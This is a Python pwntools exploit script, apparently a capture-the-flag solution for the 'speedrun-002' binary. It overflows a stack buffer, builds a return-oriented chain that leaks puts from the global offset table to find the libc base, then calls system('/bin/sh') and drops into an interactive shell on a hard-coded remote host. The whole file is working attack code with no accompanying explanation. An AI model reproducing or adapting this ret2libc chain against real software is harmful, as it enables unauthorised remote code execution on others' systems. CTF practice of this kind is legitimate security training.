#!/usr/bin/env python3

from pwn import *

exe = ELF("./speedrun-002")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

LOCAL = 0
DEBUG = 0

#POP_RAX = pack(0x00007ff1f047cca4)
POP_RDI = pack(0x4008a3)
POP_RSI = pack(0x4008a1) # pop rsi; pop r15; ret;
POP_RDX = pack(0x4006ec)


PUTS_PLT = pack(exe.plt['puts'])

PUTS_GOT = pack(exe.got['puts'])
GETENV_GOT = pack(exe.got['getenv'])
READ_GOT = pack(exe.got['read'])

#READ_GADGET = pack(0x400705)
READ_GADGET = pack(0x40074c)

LIBC_BIN_SH = (0x1b3e9a) #offset into libc

syscall_num = 0x3b


def conn():
    if LOCAL:
        if DEBUG:
            return gdb.debug([ld.path, exe.path], env={"LD_PRELOAD":libc.path})
        else:
            return process([ld.path, exe.path], env={"LD_PRELOAD":libc.path})
    else:
        return remote("54.186.242.14", 31337)


def main():
    r = conn()

    # good luck pwning :)
    r.send('Everything intelligent is so boring.')
    str_data = r.recvuntil('Tell me more.')
    sleep(0.5)
    r.send(b'a'*0x400 + b"ABCDEFGH" + 
           POP_RDI + PUTS_GOT + PUTS_PLT +
           READ_GADGET);
    sleep(0.5)
    str_data = r.recvuntil('Fascinating.\x0a')
    print(str_data)
    sleep(0.5)
    raw_data = r.recvline()
    data = reversed(raw_data[:-1:]);
    print(raw_data)
    print ("Got data for " + "puts" +"@got:")
    puts_addr_str = '0x' + (''.join(format(x, '02x') for x in data))
    print (puts_addr_str)
    sleep(0.5)
    puts_addr = int(puts_addr_str, 0)
    libc_base = puts_addr - libc.symbols['puts']
    print("libc_base = " + hex(libc_base))
    print("exec_addr = " + hex(libc_base + libc.symbols['system']))

    r.send('Everything intelligent is so boring.')
    str_data = r.recvuntil('Tell me more.')
    sleep(0.5)
    r.send(b'a'*0x400 + b"ABCDEFGH" + 
           POP_RDI + pack(libc_base + LIBC_BIN_SH) + 
           POP_RSI + pack(0000) + pack(0000) +
           POP_RDX + pack(0) + 
           pack(libc_base + libc.symbols['system']) +
           pack(0x499999))
    """
             + pack(libc_base + libc.symbols['system']))
    """
    str_data = r.recvuntil('Fascinating.\x0a')
    r.interactive()


if __name__ == "__main__":
    main()
